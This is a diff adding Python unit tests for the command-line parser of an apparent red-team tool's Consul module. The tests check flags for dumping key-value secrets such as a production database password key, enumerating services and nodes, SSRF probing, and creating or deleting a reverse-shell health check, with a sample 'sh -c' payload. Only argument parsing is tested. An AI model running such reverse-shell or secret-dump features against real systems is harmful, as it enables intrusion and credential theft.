@@ -411,6 +411,31 @@ def test_consul_flags_are_parsed() -> None:
             "80,8080-8081",
             "--ssrf-path",
             "/debug/vars?full=1",
+            "--keys",
+            "--key",
+            "redposture/env/prod/db_password",
+            "--dump",
+            "--services",
+            "--service",
+            "web",
+            "--agents",
+            "--checks",
+            "--agent",
+            "consul-agent-1",
+            "--nodes",
+            "--node",
+            "consul-node-1",
+            "--revshell",
+            "--lhost",
+            "host.docker.internal",
+            "--lport",
+            "4444",
+            "--listen",
+            "--payload",
+            "sh -c 'id >/tmp/rp.out'",
+            "--delete",
+            "--check-id",
+            "rev-rp-123",
             "-f",
             "json",
             "-o",
@@ -430,8 +455,138 @@ def test_consul_flags_are_parsed() -> None:
     assert args.ssrf_target == "127.0.0.1,10.10.0.0/30"
     assert args.ssrf_port == "80,8080-8081"
     assert args.ssrf_path == "/debug/vars?full=1"
+    assert args.show_keys is True
+    assert args.kv_key == "redposture/env/prod/db_password"
+    assert args.dump is True
+    assert args.show_services is True
+    assert args.service_dump_name == "web"
+    assert args.show_agents is True
+    assert args.show_checks is True
+    assert args.agent_name == "consul-agent-1"
+    assert args.show_nodes is True
+    assert args.node_name == "consul-node-1"
+    assert args.revshell is True
+    assert args.revshell_host == "host.docker.internal"
+    assert args.revshell_port == 4444
+    assert args.revshell_listen is True
+    assert args.revshell_payload == "sh -c 'id >/tmp/rp.out'"
+    assert args.delete_revshell is True
+    assert args.revshell_check_id == "rev-rp-123"
     assert args.output_format == "json"
     assert args.output == "consul_audit.jsonl"
+
+
+def test_consul_revshell_delete_flags_are_parsed() -> None:
+    args = parse_args(
+        [
+            "consul",
+            "-t",
+            "10.0.0.50",
+            "--revshell",
+            "--delete",
+            "--check-id",
+            "rev-rp-1700000000-abcd1234",
+        ]
+    )
+    assert args.command == "consul"
+    assert args.revshell is True
+    assert args.delete_revshell is True
+    assert args.revshell_payload is None
+    assert args.revshell_check_id == "rev-rp-1700000000-abcd1234"
+
+
+def test_consul_delete_with_check_id_without_revshell_flags_are_parsed() -> None:
+    args = parse_args(
+        [
+            "consul",
+            "-t",
+            "10.0.0.50",
+            "--delete",
+            "--check-id",
+            "rev-rp-1700000000-abcd1234",
+        ]
+    )
+    assert args.command == "consul"
+    assert args.revshell is False
+    assert args.delete_revshell is True
+    assert args.revshell_check_id == "rev-rp-1700000000-abcd1234"
+
+
+def test_consul_revshell_custom_check_id_create_flags_are_parsed() -> None:
+    args = parse_args(
+        [
+            "consul",
+            "-t",
+            "10.0.0.50",
+            "--revshell",
+            "--check-id",
+            "rev-rp-custom-id",
+            "--payload",
+            "id",
+        ]
+    )
+    assert args.command == "consul"
+    assert args.revshell is True
+    assert args.delete_revshell is False
+    assert args.revshell_check_id == "rev-rp-custom-id"
+    assert args.revshell_payload == "id"
+
+
+def test_consul_revshell_listen_flag_is_parsed() -> None:
+    args = parse_args(
+        [
+            "consul",
+            "-t",
+            "10.0.0.50",
+            "--revshell",
+            "--lhost",
+            "127.0.0.1",
+            "--lport",
+            "4444",
+            "--listen",
+        ]
+    )
+    assert args.command == "consul"
+    assert args.revshell is True
+    assert args.revshell_port == 4444
+    assert args.revshell_listen is True
+
+
+def test_consul_dump_with_check_id_selector_flags_are_parsed() -> None:
+    args = parse_args(
+        [
+            "consul",
+            "-t",
+            "127.0.0.1",
+            "--port",
+            "8500",
+            "--check-id",
+            "id:rev-rp-1772108877-b638b10f",
+            "--dump",
+        ]
+    )
+    assert args.command == "consul"
+    assert args.revshell is False
+    assert args.delete_revshell is False
+    assert args.dump is True
+    assert args.revshell_check_id == "id:rev-rp-1772108877-b638b10f"
+
+
+def test_consul_dump_with_service_selector_flags_are_parsed() -> None:
+    args = parse_args(
+        [
+            "consul",
+            "-t",
+            "127.0.0.1",
+            "--service",
+            "web",
+            "--dump",
+        ]
+    )
+    assert args.command == "consul"
+    assert args.dump is True
+    assert args.show_services is False
+    assert args.service_dump_name == "web"
 
 
 def test_etcd_flags_are_parsed() -> None:
